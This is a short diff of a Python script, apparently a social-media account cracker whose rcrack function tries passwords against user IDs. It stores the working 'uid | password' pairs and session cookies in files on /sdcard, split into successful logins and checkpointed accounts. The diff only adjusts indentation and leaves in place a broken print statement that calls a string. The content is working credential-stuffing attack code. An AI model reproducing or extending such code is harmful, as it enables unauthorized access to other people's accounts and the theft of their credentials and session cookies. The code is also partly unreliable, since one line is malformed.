@@ -305,10 +305,10 @@ def rcrack(uid,pwx,tl):
                 open('/sdcard/Firoz-🥵-OK💚.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid);cek_apk(coki)
                 break
-           elif 'checkpoint' in log_cookies:
+            elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-               print('\r\r\33[1;34m Firoz-CP'( uid+' | '+ps+' \n')
+                print('\r\r\33[1;34m Firoz-CP'( uid+' | '+ps+' \n')
                 open('/sdcard/Firoz-cp💔.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
